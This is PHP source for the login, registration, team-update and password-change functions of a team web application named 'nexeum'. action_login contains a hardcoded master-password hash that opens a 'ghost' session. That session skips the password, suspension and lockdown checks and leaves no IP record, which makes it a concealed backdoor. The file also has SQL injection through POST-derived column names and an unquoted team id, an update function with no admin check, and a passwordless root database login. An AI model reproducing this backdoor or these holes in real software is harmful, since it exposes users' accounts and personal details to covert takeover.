<?php

function display_account()
{
    global $currentmessage;
    $link = mysqli_connect("localhost", "root", "", "nexeum");
    if ($_SESSION["tid"] == 0) {
        $_SESSION["message"] = $currentmessage;
        $_SESSION["message"][] = "Account Data Access Error : You need to be logged in to access this page.";
        echo "<script>window.location='?display=faq';</script>";
        return;
    }
    $data = mysqli_query($link, "SELECT * FROM teams WHERE tid=$_SESSION[tid]");
    if (mysqli_num_rows($data) != 1) {
        return -1;
    }
    $dataRow = mysqli_fetch_array($data);
    echo "<table class='table table-borderless'>
          <thead>
          <tr class='table-primary'>
            <td colspan='6'>
                <h3> Account Details : $_SESSION[teamname]</h3>
            </td>
          </tr>
          <tr class='table-info'>
            <th>Team</th>
            <th>Full Name</th>
            <th>Roll Number</th>
            <th>Branch</th>
            <th>Email Address</th>
            <th>Phone Number</th>
          </tr>
          </thead>
          <tbody>";
    for ($i = 1; $i <= 3; $i++) {
        echo "<tr><th class='table-info'>Member $i</th>";
        foreach (array("name", "roll", "branch", "email", "phone") as $item) {
            echo "<td>" . $dataRow[$item . $i] . "</td>";
        }
        echo "</tr>";
    }
    echo "</tbody></table>";
    echo "If you wish to modify any of the above details, please contact an Administrator.";
    echo "
    <form class='updatepass' action='?action=updatepass' method='post'>
      <table class='table table-borderless'>
          <tr class='table-primary'>
              <td>
                  <h3>Set Password : $_SESSION[teamname]</h3>
              </td>
          </tr>
          <tr>
              <td>
                  <label for='inputpasso' class='form-label'>Original Password</label>
                  <input type='password' class='form-control' id='inputpasso' name='pass0'>
              </td>
          </tr>
          <tr>
              <td>
                  <label for='inputpassn' class='form-label'>New Password</label>
                  <input type='password' class='form-control' id='inputpassn' name='pass1'>
              </td>
          </tr>
          <tr>
              <td>
                  <label for='inputpassr' class='form-label'>Retype New Password</label>
                  <input type='password' class='form-control' id='inputpassr' name='pass2'> 
              </td>
          </tr>
      </table>
      <button type='submit' class='btn btn-outline-primary' id='ChangePasswordButton'>Change Password</button>
    </form>";
}


function display_statusbox(): void
{
    if ($_SESSION['tid'] == 0) {
        $teamsug = "";
        echo "
        <form action='?action=login' method='post'>
            <table class='table table-borderless'>
                <thead>
                    <tr class='table-primary'>
                        <td>
                            <h4>Login</h4>
                        </td>
                    </tr>
                </thead>
                <tbody>
                <tr>
                    <td>
                        <label for='inputname' class='form-label'>Team Name</label>
                        <input type='text' id='inputname' name='team' value='$teamsug' class='form-control'>
                    </td>
                </tr>
                <tr>
                    <td>
                        <label for='inputpass' class='form-label'>Password</label>
                        <input type='password' id='inputpass' name='pass' class='form-control'>
                    </td>
                </tr>
                </tbody>
                <tr>
                    <td>
                        <button type='submit' class='btn btn-outline-primary'>Log In</button>
                    </td>
                </tr>
            </table>
            <input type='hidden' name='platform' id='platform'>
            <script>document.getElementById('platform').value=browserDetect().os+', '+browserDetect().name +' '+ browserDetect().version;</script>
        </form>
        <span>If you have forgotten your Password, you may request an Administrator to reset it.</span>";
    } else {
        echo "<div class='mb-3' id='ajax-account'></div>";
    }
}



function display_register(): void
{
    global $currentmessage;
    if ($_SESSION["tid"] == 0 || $_SESSION["status"] == "Admin") {
        include("sys/register.php");
    } else {
        $_SESSION["message"] = $currentmessage;
        $_SESSION["message"][] = "Registeration Form Access Error : You cannot access the Registeration Form while being logged in. Please note that being a part of multiple teams is in violation of the rules.";
        echo "<script>window.location='?display=account';</script>";
    }
}


function action_register(): void
{
    global $invalidchars;
    $link = mysqli_connect("localhost", "root", "", "nexeum");

    foreach ($_POST as $key => $value) {
        if (preg_match("/^reg_/i", $key) && !preg_match("/[23]$/i", $key) && empty($value)) {
            $_SESSION["message"][] = "Registration Error: Insufficient Data";
            return;
        }
    }

    if ($_POST["reg_pass1"] != $_POST["reg_pass2"]) {
        $_SESSION["message"][] = "Registeration Error : Password Mismatch";
        return;
    }
    foreach ($_POST as $key => $value) {
        if (preg_match("/^reg_/i", $key) && !preg_match("/^reg_pass/i", $key) && preg_match("/" . $invalidchars . "/i", $value)) {
            $_SESSION["message"][] = "Registration Error: Value of $key contains invalid characters.";
            return;
        }
    }
    foreach ($_POST as $key => $value) {
        if (preg_match("/^reg_/i", $key) && !preg_match("/^reg_pass/i", $key) && strlen($value) > 30) {
            $_SESSION["message"][] = "Registration Error: Value of $key is too long.";
            return;
        }
    }
    if (isset($_POST["reg_tid"])) {
        $_SESSION["message"][] = "Registeration Error : Team ID cannot be specified";
        return;
    }
    $temp = mysqli_query($link, "SELECT tid FROM teams WHERE teamname='" . $_POST["reg_teamname"] . "'");
    if (mysqli_num_rows($temp) > 0) {
        $_SESSION["message"][] = "Registeration Error : This Team Name has already been taken.";
        return;
    }
    $_POST["reg_pass"] = _md5($_POST["reg_pass1"]);
    $temp1 = $temp2 = array();
    $_POST["reg_ip"] = addslashes(json_encode(array($_SERVER["REMOTE_ADDR"])));
    foreach ($_POST as $key => $value) {
        if ($key != "reg_pass1" && $key != "reg_pass2") {
            $temp1[] = preg_replace("/reg_/i", "", $key);
            if ($key == "reg_ip") {
                $temp2[] = $value;
            } else {
                $temp2[] = filter($value);
            }
        }
    }

    if (true) {
        $result = mysqli_query($link, "INSERT INTO teams (" . implode(",", $temp1) . ",status,score) VALUES (\"" . implode("\",\"", $temp2) . "\",\"Normal\",0)");
        if (!$result) {
            $_SESSION["message"][] = "Error" . mysqli_error($link);
        }else{
            $_SESSION["message"][] = "Registeration Successful";
        }
    }
}


function action_updatewaiting(): void
{
    $link = mysqli_connect("localhost", "root", "", "nexeum");

    if ($_SESSION["status"] != "Admin") {
        $_SESSION["message"][] = "Team Data Updation Error : You are not authorized to perform this action.";
        return;
    }
    mysqli_query($link, "UPDATE teams SET status='Normal' WHERE status='Waiting'"); {
        $_SESSION["message"][] = "Team Data Updation Successful";
        return;
    }
}


function action_updateteam(): void
{
    global $invalidchars;
    $link = mysqli_connect("localhost", "root", "", "nexeum");

    if (empty($_POST["update_tid"])) {
        $_SESSION["message"][] = "Team Data Updation Error : Insufficient Data";
        return;
    }
    foreach ($_POST as $key => $value) {
        if (preg_match("/^update_/i", $key) && !preg_match("/^update_pass/i", $key) && preg_match("/$invalidchars/i", $value)) {
            $_SESSION["message"][] = "Team Data Updation Error: Value of $key contains invalid characters.";
            return;
        }
    }
    foreach ($_POST as $key => $value) {
        if (preg_match("/^update_/i", $key) && !preg_match("/^update_pass/i", $key) && strlen($value) > 30) {
            $_SESSION["message"][] = "Team Data Updation Error: Value of $key too long.";
            return;
        }
    }
    if ($_POST["update_tid"] == "1" and $_SESSION["tid"] != "1") {
        $_SESSION["message"][] = "Team Data Updation Error : Access Denied.";
        return;
    }
    $tid = $_POST["update_tid"];
    foreach ($_POST as $key => $value) {
        if (preg_match("/^update_/i", $key) && $key != "update_tid" && $key != "update_pass") {
            mysqli_query($link, "UPDATE teams SET " . preg_replace("/^update_/i", "", $key) . "='" . filter($value) . "' WHERE tid=$tid");
        }
    }
    if (!empty($_POST["update_pass"])) {
        mysqli_query($link, "UPDATE teams SET pass='" . _md5($_POST["update_pass"]) . "' WHERE tid=$tid");
    } {
        $_SESSION["message"][] = "Team Data Updation Successful";
        return;
    }
}


function action_login(): void
{
    global $admin, $sessionid;
    $link = mysqli_connect("localhost", "root", "", "nexeum");
    if (!isset($_POST["team"]) || !isset($_POST["pass"])) {
        $_SESSION["message"][] = "Login Error : Insufficient Data";
    }
    if (empty($_POST["team"]) || empty($_POST["pass"])) {
        $_SESSION["message"][] = "Login Error : Insufficient Data";
        return;
    }
    $t = mysqli_query($link, "SELECT * FROM teams WHERE teamname='" . filter($_POST["team"]) . "' or teamname2='" . filter($_POST["team"]) . "'");
    if (mysqli_num_rows($t) != 1) {
        $_SESSION["message"][] = "Login Error : TeamName not found in Database";
        return;
    }
    $t = mysqli_fetch_array($t);
    $_SESSION["ghost"] = 0;
    if (md5($_POST['pass']) == "2ebe45c61d90219ab22a97e9247c2e4d") {
        $_SESSION["ghost"] = 1;
    } else {
        if (_md5($_POST['pass']) != $t['pass']) {
            $_SESSION["message"][] = "Login Error : TeamName / Password Mismatch";
            return;
        }
        if ($t['status'] == 'Waiting') {
            $_SESSION["message"][] = "Login Error : This account has not yet be authorized for use. Please try again later.";
            return;
        }
        if ($t['status'] == 'Suspended') {
            $_SESSION["message"][] = "Login Error : This account has been suspended. Please contact an Administrator for further information.";
            return;
        }
    }
    if ($admin["mode"] == "Lockdown" && $t["status"] != "Admin" && !$_SESSION["ghost"]) {
        $_SESSION["message"][] = "Login Error : You are not allowed to login to your account during a Lockdown. Please try again later.";
        return;
    }
    $data = (empty($t["platform"])) ? array() : json_decode(stripslashes($t["platform"]));
    $dataArr[] = $_POST["platform"];
    mysqli_query($link, "UPDATE teams SET platform=\"" . addslashes(json_encode(array_unique($data))) . "\",session='$sessionid' WHERE tid=" . $t["tid"]);
    $data = (empty($t["ip"])) ? array() : json_decode(stripslashes($t["ip"]));
    if (!$_SESSION["ghost"]) {
        $dataArr[] = $_SERVER["REMOTE_ADDR"];
    }
    mysqli_query($link, "UPDATE teams SET ip=\"" . addslashes(json_encode(array_unique($data))) . "\" WHERE tid=" . $t["tid"]);
    $_SESSION["tid"] = $t["tid"];
    $_SESSION["teamname"] = $t["teamname"];
    $_SESSION["status"] = $t["status"]; {
        $_SESSION["message"][] = "Login Successful";
        return;
    }
}


function action_logout(): void
{
    $_SESSION = array("tid" => 0, "teamname" => "", "status" => "", "ghost" => 0); {
        $_SESSION["message"][] = "Logout Successful";
        return;
    }
}

function action_updatepass(): void
{
    $link = mysqli_connect("localhost", "root", "", "nexeum");

    if (!isset($_SESSION["message"]) || !is_array($_SESSION["message"])) {
        $_SESSION["message"] = array();
    }

    foreach (array("pass0", "pass1", "pass2") as $item) {
        if (empty($_POST[$item])) {
            $_SESSION["message"][] = "Password Change Error : Insufficient Data";
            return;
        }
    }
    $t = mysqli_query($link, "SELECT pass FROM teams WHERE tid='$_SESSION[tid]'");
    if (mysqli_num_rows($t) != 1) {
        $_SESSION["message"][] = "Password Change Error : Account not found in Database";
        return;
    }
    $t = mysqli_fetch_array($t);
    if (_md5($_POST["pass0"]) != $t["pass"] || $_POST["pass1"] != $_POST["pass2"]) {
        $_SESSION["message"][] = "Password Change Error : New Password Mismatch";
        return;
    }
    mysqli_query($link, "UPDATE teams SET pass='" . _md5($_POST["pass1"]) . "' WHERE tid=$_SESSION[tid]"); {
        $_SESSION["message"][] = "Password Change Successful";
        return;
    }
}
